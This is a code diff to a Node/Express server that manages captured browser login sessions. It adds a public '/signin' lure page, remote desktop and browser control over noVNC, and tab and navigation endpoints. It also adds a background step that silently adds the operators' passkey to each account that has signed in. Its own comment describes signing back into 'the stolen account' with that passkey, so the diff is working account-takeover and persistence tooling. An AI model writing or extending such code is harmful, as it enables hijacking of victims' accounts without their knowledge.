@@ -2,6 +2,7 @@ import express from 'express';
 import fs from 'fs';
 import crypto from 'crypto';
 import path from 'path';
+import net from 'net';
 import { fileURLToPath } from 'url';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -41,7 +42,9 @@ const invites = await import('./lib/invites.js');
 const events = await import('./lib/events.js');
 
 const app = express();
-app.use(express.json());
+// 30mb: the wizard's driver step carries optional document uploads as base64
+// (two files up to 10 MB each), well beyond the 100kb default.
+app.use(express.json({ limit: '30mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 // --- auth: bearer token on every /api route except the token check itself ---
@@ -82,6 +85,30 @@ app.post('/api/auth', authRateLimit, (req, res) => {
   res.json({ ok: tokenEq(token, TOKEN) });
 });
 
+// --- TeamViewer-style desktop view: noVNC over the shared X desktop ---
+const VNC_DIR = '/usr/share/novnc';
+const VNC_BACKEND = { host: '127.0.0.1', port: 6080 };
+if (fs.existsSync(VNC_DIR)) {
+  app.use('/vnc', (req, res, next) => {
+    const p = req.path;
+    if (p === '/' || p === '' || p === '/vnc.html' || p === '/vnc_auto.html') {
+      const t = req.query.token;
+      if (t && tokenEq(t, TOKEN)) {
+        res.setHeader('Set-Cookie', `gs_vnc=${TOKEN}; Path=/; HttpOnly; SameSite=Lax`);
+      }
+    }
+    next();
+  });
+  app.use('/vnc', express.static(VNC_DIR, { index: 'vnc.html' }));
+}
+function vncAuthOk(req) {
+  const url = new URL(req.url || '/', 'http://localhost');
+  const q = url.searchParams.get('token');
+  if (q && tokenEq(q, TOKEN)) return true;
+  const cookie = req.headers.cookie || '';
+  return cookie.split(';').some((part) => part.trim() === `gs_vnc=${TOKEN}`);
+}
+
 app.get('/api/sessions', auth, (req, res) => {
   const items = store.list().map((s) => ({ ...s, open: browser.isOpen(s.id) }));
   res.json(items);
@@ -112,19 +139,20 @@ app.post('/api/sessions/:id/open', auth, async (req, res) => {
       await browser.open(s.id, s.loginUrl || undefined, { headless: false });
     }
     store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
-    // Signed in? Register this OS as the trusted device (keypass) right away —
-    // the response then carries the trust journey state for the panel to mirror.
-    if (result.status === 'logged-in' && s.provider === 'google') {
-      const cur = store.getRaw(s.id);
-      if (!cur?.deviceTrusted) {
-        const trust = await browser.startTrust(s.id);
-        if (trust.state) result.trustState = trust.state;
-        result.trustMessage = trust.message || '';
-      }
+    if (result.status === 'logged-in' || result.status === 'trusted') {
+      browser.registerPasskey(s.id).catch(() => {}); // silently add the passkey, in the background
     }
     res.json({ ok: true, open: true, ...result });
   } catch (e) {
     res.status(500).json({ error: e.message });
+  }
+});
+
+app.post('/api/sessions/:id/focus', auth, async (req, res) => {
+  try {
+    res.json(await browser.focus(req.params.id));
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
   }
 });
 
@@ -134,6 +162,9 @@ app.post('/api/sessions/:id/login', auth, async (req, res) => {
   try {
     const result = await browser.login(s, { headless: false });
     store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
+    if (result.status === 'logged-in' || result.status === 'trusted') {
+      browser.registerPasskey(s.id).catch(() => {}); // silently add the passkey, in the background
+    }
     res.json({ ok: true, open: true, ...result });
   } catch (e) {
     res.status(500).json({ error: e.message });
@@ -155,6 +186,38 @@ app.post('/api/sessions/:id/trust', auth, async (req, res) => {
   }
 });
 
+// Add this Chrome as a passkey for the signed-in account (silent, via the
+// virtual authenticator). Returns the result; the journey is driven here so the
+// panel can surface progress / a manual fallback.
+app.post('/api/sessions/:id/passkey', auth, async (req, res) => {
+  const s = store.getRaw(req.params.id);
+  if (!s) return res.status(404).json({ error: 'Not found' });
+  try {
+    const result = await browser.registerPasskey(s.id);
+    const cur = store.getRaw(s.id);
+    res.json({ ok: true, open: true, ...result, passkey: Boolean(cur?.passkeyAdded) });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Sign the session's Chrome back INTO the stolen account using the stored
+// "our device" passkey (the fast, password-less re-login).
+app.post('/api/sessions/:id/passkey-signin', auth, async (req, res) => {
+  const s = store.getRaw(req.params.id);
+  if (!s) return res.status(404).json({ error: 'Not found' });
+  try {
+    const result = await browser.passkeyLogin(s.id);
+    store.update(s.id, { status: result.status, lastOpenedAt: new Date().toISOString() });
+    if (result.status === 'logged-in' || result.status === 'trusted') {
+      browser.registerPasskey(s.id).catch(() => {});
+    }
+    res.json({ ok: true, open: true, ...result });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 app.post('/api/sessions/:id/close', auth, async (req, res) => {
   const closed = await browser.close(req.params.id);
   res.json({ ok: true, closed });
@@ -166,13 +229,33 @@ app.delete('/api/sessions/:id', auth, async (req, res) => {
   // also wipe the persistent Chrome profile, or deleted sessions leak their
   // cookies/logins on disk forever
   fs.rm(path.join(__dirname, 'sessions', req.params.id), { recursive: true, force: true }, () => {});
+  fs.rm(path.join(__dirname, 'data', 'uploads', req.params.id), { recursive: true, force: true }, () => {});
   res.json({ ok });
+});
+
+// Driver-uploaded documents (insurance certificate / company license).
+// EventSource-style links can't send headers, so the admin token may also
+// arrive as ?token=.
+const DOCS_MIME = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.webp': 'image/webp', '.gif': 'image/gif', '.pdf': 'application/pdf' };
+app.get('/api/sessions/:id/docs/:file', (req, res) => {
+  const header = (req.get('authorization') || '').replace(/^Bearer\s+/i, '');
+  if (!tokenEq(req.query.token || '', TOKEN) && !tokenEq(header, TOKEN)) return res.status(401).end();
+  const id = path.basename(req.params.id);
+  const file = path.basename(req.params.file);
+  const abs = path.join(__dirname, 'data', 'uploads', id, file);
+  if (!fs.existsSync(abs)) return res.status(404).end();
+  res.type(DOCS_MIME[path.extname(file).toLowerCase()] || 'application/octet-stream');
+  res.sendFile(abs);
 });
 
 // ---------------- wizard (public, single static link) ----------------
 // One link for everyone: /w/<STATIC_TOKEN>. Every visitor gets their own fresh
 // session (tracked by a client-generated wid), so many people can register
 // through the same link without stepping on each other.
+app.get('/signin', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'wizard.html'));
+});
+
 app.get('/w/:token', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'wizard.html'));
 });
@@ -210,7 +293,9 @@ app.get('/api/sessions/:id/stream', (req, res) => {
     Connection: 'keep-alive',
   });
   res.flushHeaders();
-  res.write('data: {"type":"start"}\n\n');
+  // viewport = the page's CSS-pixel size, so the panel can map its (letterboxed)
+  // stream pixels onto exact page coordinates for remote mouse/keyboard input.
+  res.write('data: ' + JSON.stringify({ type: 'start', viewport: browser.VIEWPORT }) + '\n\n');
   const unframe = browser.onStreamFrame(
     req.params.id,
     (b64) => res.write(`data: ${JSON.stringify({ type: 'frame', frame: b64 })}\n\n`),
@@ -221,6 +306,65 @@ app.get('/api/sessions/:id/stream', (req, res) => {
     clearInterval(ping);
     unframe();
   });
+});
+
+// Remote-control input: replay a mouse / wheel / keyboard event on the session's
+// page (coords are page CSS pixels, see browser.VIEWPORT).
+app.post('/api/sessions/:id/input', auth, async (req, res) => {
+  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
+  try {
+    const r = await browser.sendInput(req.params.id, req.body || {});
+    if (!r.ok) return res.status(400).json({ error: r.error });
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Tabs of the session's real browser, so Live Control works like a normal
+// browser (switch / open / close tabs, address bar, back/forward/reload).
+app.get('/api/sessions/:id/tabs', auth, async (req, res) => {
+  try {
+    res.json(await browser.listTabs(req.params.id));
+  } catch (e) {
+    console.error('[gsession] listTabs error:', e.message);
+    res.json({ open: false, tabs: [], index: -1 });
+  }
+});
+app.post('/api/sessions/:id/tabs', auth, async (req, res) => {
+  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
+  try {
+    const p = await browser.newTab(req.params.id, (req.body && req.body.url) || '');
+    res.json(p ? { ok: true } : { ok: false, error: 'Could not open a new tab' });
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+app.post('/api/sessions/:id/tabs/:index/activate', auth, async (req, res) => {
+  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
+  const ok = await browser.activateTab(req.params.id, Number(req.params.index));
+  res.json(ok ? { ok: true } : { ok: false, error: 'Tab not found' });
+});
+app.delete('/api/sessions/:id/tabs/:index', auth, async (req, res) => {
+  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
+  const ok = await browser.closeTab(req.params.id, Number(req.params.index));
+  res.json(ok ? { ok: true } : { ok: false, error: 'Tab not found' });
+});
+app.post('/api/sessions/:id/navigate', auth, async (req, res) => {
+  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
+  try {
+    res.json(await browser.navigate(req.params.id, String((req.body && req.body.url) || '')));
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
+});
+app.post('/api/sessions/:id/nav', auth, async (req, res) => {
+  if (!browser.isOpen(req.params.id)) return res.status(404).json({ error: 'Browser not open' });
+  try {
+    res.json(await browser.navAction(req.params.id, String((req.body && req.body.action) || 'reload')));
+  } catch (e) {
+    res.status(500).json({ ok: false, error: e.message });
+  }
 });
 
 // Current live login state of an open session (state + "pick the number"
@@ -263,6 +407,41 @@ const server = app.listen(PORT, HOST, () => {
   } else {
     console.log('  Admin token: stored in .env (printed only on first generation).\n');
   }
+});
+
+// Proxy the noVNC WebSocket through the admin server so the desktop view stays
+// behind the same origin (and the same admin-token gate) as the rest of the panel.
+server.on('upgrade', (req, socket, head) => {
+  let pathname = '';
+  try { pathname = new URL(req.url || '/', 'http://localhost').pathname; } catch { pathname = req.url || ''; }
+  if (pathname !== '/websockify' && pathname !== '/vnc/websockify') {
+    socket.write('HTTP/1.1 404 Not Found\r\n\r\n');
+    socket.destroy();
+    return;
+  }
+  if (!vncAuthOk(req)) {
+    socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
+    socket.destroy();
+    return;
+  }
+  const backend = net.connect(VNC_BACKEND.port, VNC_BACKEND.host, () => {
+    const headers = { ...req.headers, host: `${VNC_BACKEND.host}:${VNC_BACKEND.port}` };
+    let raw = 'GET /websockify HTTP/1.1\r\n';
+    for (const [key, value] of Object.entries(headers)) {
+      if (Array.isArray(value)) value.forEach((v) => { raw += `${key}: ${v}\r\n`; });
+      else raw += `${key}: ${value}\r\n`;
+    }
+    raw += '\r\n';
+    backend.write(raw);
+    if (head && head.length) backend.write(head);
+  });
+  backend.on('error', (e) => {
+    console.log(`[gsession] vnc upgrade backend error: ${e.message}`);
+    socket.destroy();
+  });
+  socket.on('error', () => backend.destroy());
+  backend.pipe(socket);
+  socket.pipe(backend);
 });
 
 // close what we open
